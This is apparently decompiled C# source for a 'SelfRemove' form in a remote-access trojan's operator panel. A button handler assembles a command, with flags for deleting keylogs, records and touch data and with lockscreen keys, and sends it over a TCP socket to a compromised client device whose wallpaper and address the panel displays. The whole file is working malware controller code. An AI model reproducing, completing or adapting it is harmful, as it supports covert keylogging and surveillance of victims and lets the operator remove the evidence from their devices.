using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000BD RID: 189
[DesignerGenerated]
public partial class SelfRemove : Form
{
	// Token: 0x06000810 RID: 2064 RVA: 0x000035B8 File Offset: 0x000017B8
	public SelfRemove()
	{
		base.Load += this.SelfRemove_Load;
		this.InitializeComponent();
	}

	// Token: 0x06000813 RID: 2067 RVA: 0x000BF418 File Offset: 0x000BD618
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		TcpClient myClient = this.Classclient.myClient;
		string[] array = this.Classclient.Keys.Split(new char[]
		{
			':'
		});
		int value = 0;
		int value2 = 0;
		string text = "";
		if (this.checkrecords.Checked)
		{
			text += "_RE_";
		}
		if (this.checkkeylogs.Checked)
		{
			text += "_FK_";
		}
		if (this.checktouch.Checked)
		{
			text += "_TH_";
		}
		object[] parametersObjects = new object[]
		{
			myClient,
			string.Concat(new string[]
			{
				SecurityKey.KeysClient2,
				Data.SPL_SOCKET,
				"SFD<*>SLF",
				text,
				Data.SPL_SOCKET,
				array[0],
				Data.SPL_SOCKET,
				array[1],
				Data.SPL_SOCKET,
				SecurityKey.Lockscreen,
				Data.SPL_SOCKET,
				Conversions.ToString(value),
				Data.SPL_SOCKET,
				Conversions.ToString(value2),
				Data.SPL_SOCKET,
				Data.SPL_ARRAY,
				Data.SPL_SOCKET,
				this.Classclient.ClientRemoteAddress
			}),
			Codes.Encoding().GetBytes("null"),
			this.Classclient
		};
		this.Classclient.SendMessage(parametersObjects);
	}

	// Token: 0x06000814 RID: 2068 RVA: 0x000BF588 File Offset: 0x000BD788
	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "ar");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
				this.Label34.Text = Codes.Translate(this.Label34.Text, "en", "ar");
			}
		}
		else
		{
			this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "zh");
			this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
			this.Label34.Text = Codes.Translate(this.Label34.Text, "en", "zh");
		}
	}

	// Token: 0x06000815 RID: 2069 RVA: 0x000035D8 File Offset: 0x000017D8
	private void SelfRemove_Load(object sender, EventArgs e)
	{
		this.clientpic.Image = this.Classclient.Wallpaper;
	}

	// Token: 0x04000BC2 RID: 3010
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	// Token: 0x04000BC3 RID: 3011
	public Client Classclient;
}
